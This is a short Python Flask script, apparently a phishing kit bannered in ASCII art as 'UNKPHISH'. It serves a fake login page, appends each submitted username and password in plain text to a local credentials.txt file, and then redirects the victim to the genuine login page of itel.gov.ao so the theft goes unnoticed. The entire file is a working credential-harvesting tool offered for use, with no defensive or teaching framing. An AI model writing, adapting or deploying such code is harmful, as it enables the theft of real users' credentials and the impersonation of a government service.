from flask import Flask, render_template, request, redirect
from colorama import init, Fore, Back

ascii_art = f"""

{Fore.GREEN}@@@  @@@  @@@  @@@  @@@ @@@  @@@@@@@   @@@  @@@  @@@   @@@@@@   @@@  @@@  
{Fore.GREEN}@@@  @@@  @@@@ @@@  @@@ @@@  @@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@  @@@  
{Fore.GREEN}@@!  @@@  @@!@!@@@  @@! !@@  @@!  @@@  @@!  @@@  @@!  !@@       @@!  @@@  
{Fore.GREEN}!@!  @!@  !@!!@!@!  !@! @!!  !@!  @!@  !@!  @!@  !@!  !@!       !@!  @!@  
{Fore.GREEN}@!@  !@!  @!@ !!@!   !@!@!   @!@@!@!   @!@!@!@!  !!@  !!@@!!    @!@!@!@!  
{Fore.GREEN}!@!  !!!  !@!  !!!    @!!!   !!@!!!    !!!@!!!!  !!!   !!@!!!   !!!@!!!!  
{Fore.GREEN}!!:  !!!  !!:  !!!    !!:    !!:       !!:  !!!  !!:       !:!  !!:  !!!  
{Fore.GREEN}:!:  !:!  :!:  !:!    :!:    :!:       :!:  !:!  :!:      !:!   :!:  !:!  
{Fore.GREEN}::::: ::   ::   ::     ::     ::       ::   :::   ::  :::: ::   ::   :::  
{Fore.GREEN} : :  :   ::    :      :      :         :   : :  :    :: : :     :   : :  

"""

print(ascii_art)

app = Flask(__name__)


@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Armazenar as credenciais em um arquivo
    with open("credentials.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")

    return redirect("https://itel.gov.ao/login")

if __name__ == "__main__":
    # Exibir a arte ASCII apenas uma vez
    
    app.run(debug=True, port=2024)